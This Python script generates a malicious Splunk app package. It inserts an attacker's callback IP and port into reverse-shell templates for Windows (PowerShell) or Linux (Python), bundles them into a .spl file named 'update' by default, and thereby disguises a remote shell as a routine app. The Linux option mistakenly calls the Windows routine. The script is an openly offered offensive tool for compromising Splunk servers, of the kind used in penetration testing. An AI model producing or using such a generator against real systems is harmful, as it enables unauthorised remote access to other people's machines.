# This script automates the creation process of the splunk rev shell directory
import os
import sys
import argparse # for adding args with help messages

parser = argparse.ArgumentParser(description = "Splunk Reverse Shell Generator")

parser.add_argument("-H", "--host", type = str, required = True, help = "Callback IP")
parser.add_argument("-P", "--port", type = str, required = True, help = "Callback port number")
parser.add_argument("-T", "--target", type = str, required = True, help = "Target OS (Windows | Linux)(W | L)")
parser.add_argument("-O", "--output", type = str, required = False, default = "update", help = "Name of the outputted payload folder. (Defaults to 'update')")

args = parser.parse_args()

host = args.host
port = args.port
target = args.target
output_name = args.output

def convert_windows(host_ip, port_num):
    '''Performs the detail inserts into the Windows specific files.
    '''

    contents = ""

    # read the data from the template
    with open("reverse_shell_splunk/template/run.ps1", "r") as win:
        contents = win.read()

    # change the contents using the supplied data
    contents = contents.replace("|ATTACK_IP|", host_ip)
    contents = contents.replace("11111", str(port_num))

    # remove the fluff
    contents = contents.replace("#A simple and small reverse shell. Options and help removed to save space.", "")
    contents = contents.replace("#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.", "")

    # overwrite the contents of the out file
    with open("reverse_shell_splunk/bin/run.ps1", "w") as win:
        win.write(contents)

    print(f"[+] Windows files have been updated!")


def convert_linux(host_ip, port_num):
    '''Performs the detail inserts into the Linux specific files.
    '''
    contents = ""

    # read the data from the template
    with open("reverse_shell_splunk/template/rev.py", "r") as lin:
        contents = lin.read()

    # change the contents using the supplied data
    contents = contents.replace("|ATTACK_IP|", host_ip)
    contents = contents.replace("|ATTACK_PORT|", port_num)

    # remove the fluff
    contents = contents.replace("#A simple and small reverse shell. Options and help removed to save space.", "")
    contents = contents.replace("#Uncomment and change the hardcoded IP address and port number in the below line. Remove all help comments as well.", "")

    # overwrite the contents of the out file
    with open("reverse_shell_splunk/bin/rev.py", "w") as lin:
        lin.write(contents)

    print(f"[+] Linux files have been updated!")


if __name__ == "__main__":

    print(f"[+] Starting generation process...")

    # let's attempt to convert the files
    if target == "Windows" or target == "W":
        convert_windows(host, port)
    elif target == "Linux" or target == "L":
        convert_windows(host, port)
    else:
        print(f"[!] Error! Invalid target specified.\nValid options are:\n\nWindows | W - for windows targets\nLinux | L - for Linux targets")
        sys.exit()

    # all is good, let's create the output
    os.system(f"tar -cvzf {output_name}.tgz reverse_shell_splunk/bin reverse_shell_splunk/default")
    os.system(f"mv {output_name}.tgz {output_name}.spl")

    print(f"[+] File generation process complete!")